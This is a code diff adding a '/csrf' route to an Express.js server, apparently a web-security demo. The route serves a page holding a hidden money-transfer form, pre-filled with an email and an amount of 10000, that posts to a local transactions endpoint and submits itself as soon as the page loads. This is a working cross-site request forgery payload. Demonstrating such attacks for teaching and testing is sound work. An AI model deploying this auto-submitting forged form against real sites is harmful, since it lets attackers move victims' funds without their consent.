@@ -49,6 +49,36 @@ app.get('/cors', (req, res) => {
    });
 })
 
+app.get('/csrf', async (req, res) => {
+    return res.send(`<html>
+        <main>
+            <article>
+                <form id="transaction-form" method="POST" action="http://localhost:3000/transactions">
+                    <h1>Send funds</h1>
+                    <fieldset>
+                        <p>
+                            <label>
+                                Email destination
+                                <input name="email" type="email" value="jcfa+2@dei.uc.pt" placeholer="Email to receive money"/>
+                            </label>
+                        <p>                        
+                        <p>
+                            <label>
+                                Amount
+                                <input name="amount" type="number" value="10000" placeholer="Write the amount"/>
+                            </label>
+                        </p>
+                        <button type="submit">Send</button>
+                    </fieldset>                    
+                </form>
+            </article>
+        </main>
+        <script>
+            document.getElementById("transaction-form").submit();
+        </script>
+    </html>`);
+})
+
 app.post('/sign-up', async (req, res) => {
     const { name, email, password} = req.body
     console.log('Sign Up Body: ', req.body);
